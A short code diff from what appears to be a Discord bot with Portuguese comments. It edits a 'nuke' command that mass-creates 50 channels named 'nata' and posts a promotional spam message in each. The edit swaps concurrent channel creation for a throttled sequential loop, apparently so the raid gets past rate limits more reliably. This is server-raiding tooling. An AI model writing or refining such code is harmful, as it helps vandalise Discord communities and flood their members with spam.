@@ -42456,7 +42456,7 @@ async def nuke_cmd(ctx: commands.Context):
             pass
 
     # ── Recria 50 canais "nata" com a mensagem de divulgação ─────────────────
-    async def _criar_e_enviar():
+    for _ in range(50):
         try:
             ch = await guild.create_text_channel("nata", reason="Nuke — recriação")
             await ch.send(
@@ -42465,8 +42465,7 @@ async def nuke_cmd(ctx: commands.Context):
             )
         except Exception:
             pass
-
-    await asyncio.gather(*[_criar_e_enviar() for _ in range(50)])
+        await asyncio.sleep(0.5)
 
 
 # =============================================================================
